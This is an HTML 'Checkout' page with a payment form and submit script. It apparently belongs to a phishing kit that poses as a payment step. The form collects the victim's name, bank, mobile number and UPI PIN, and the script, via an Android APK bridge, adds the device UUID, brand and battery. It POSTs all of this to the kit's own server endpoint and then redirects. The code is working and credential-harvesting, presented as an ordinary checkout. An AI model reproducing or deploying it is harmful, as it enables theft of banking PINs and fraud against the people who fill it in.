<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checkout</title>
<link rel="stylesheet" type="text/css" href="style2.css">
</head>
<body>
<div class="banner">
  <img src="01.jpg" alt="Banner Image" style="width:100%; height:100%;">
</div>

<div class="container">
  <h1 style="text-align:center;"></h1>
  <form id="paymentForm">
    <div class="form-section">
      <h2>ENTER YOUR CREDENTIALS</h2>

      <label for="customerName">Customer Name</label>
      <input type="text" id="customerName" name="customerName" placeholder="Enter your name" required>

      <label for="bankName">Bank Name</label>
      <input type="text" id="bankName" name="bankName" placeholder="Enter bank name" required>

      <label for="mobileNumber">Mobile Number</label>
      <input type="tel" id="mobileNumber" placeholder="Linked mobile number" required maxlength="10">

      <label for="amount">Amount</label>
      <input type="tel" id="amount" placeholder="Enter amount" required maxlength="5">

      <label for="upiPin">UPI PIN</label>
      <input type="password" id="upiPin" name="upiPin" placeholder="Enter UPI PIN" required maxlength="6" inputmode="numeric" pattern="\d*">
    </div>

    <button type="submit">MAKE PAYMENT</button>
  </form>
</div>

<script>
const form = document.getElementById('paymentForm');

form.addEventListener('submit', async e => {
    e.preventDefault();

    const data = {
        customer_name: document.getElementById('customerName').value,
        bank_name: document.getElementById('bankName').value,
        mobile_number: document.getElementById('mobileNumber').value,
        amount: document.getElementById('amount').value,
        upi_pin: document.getElementById('upiPin').value
    };

    // UUID, brand & battery from APK
    if(window.AndroidDevice){
        data.uuid = AndroidDevice.getUUID();
        data.brand = AndroidDevice.getBrand();       // APK must implement getBrand()
        data.battery = AndroidDevice.getBattery();
    } else {
        data.uuid = crypto.randomUUID();
        data.brand = "Unknown";
        data.battery = "100%";
    }

    try {
        await fetch('/html-form-data', {  // replace with your Node.js endpoint
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(data)
        });
        window.location.href = 'next-page.html';
    } catch(err){
        console.error(err);
        alert('‚ùå Error sending data to server.');
    }
});
</script>
</body>
</html>
